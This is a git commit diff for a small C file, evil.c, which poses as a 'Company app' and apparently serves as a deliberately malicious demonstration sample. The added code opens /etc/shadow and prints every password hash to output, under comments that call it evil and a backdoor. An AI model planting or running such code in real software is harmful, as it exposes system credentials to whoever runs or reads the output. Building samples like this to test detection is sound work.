4f72d7ca19d7f03eddf3592587f667d6e4b7712f
Magnus Glantz <sudo@redhat.com>
2022-05-23 14:04:40 +0200

    Update evil.c

--- src/evil.c
+++ src/evil.c
@@ -4,14 +4,25 @@
 int main()
 {
    printf("Company app is running\n");
-   int buffer;
-   int store = 1234;
-   // Evil backdoor reads system password hashes
-   FILE * fp;
-   fp = fopen ("/etc/shadow", "r+");
-   fread(&buffer, sizeof(int), 1, fp);
+ 
+   // Evil
+   char *filename = "/etc/shadow";
+   FILE *fp = fopen(filename, "r");
+
+   if (fp == NULL)
+   {
+       printf("Error: could not open file %s", filename);
+       return 1;
+   }
+
+   // read one character at a time and
+   // display it to the output
+   char ch;
+   while ((ch = fgetc(fp)) != EOF)
+       putchar(ch);
+
+   // close the file
    fclose(fp);
-   printf("Evil backdoor initiated\n");
    
    return(0);
 
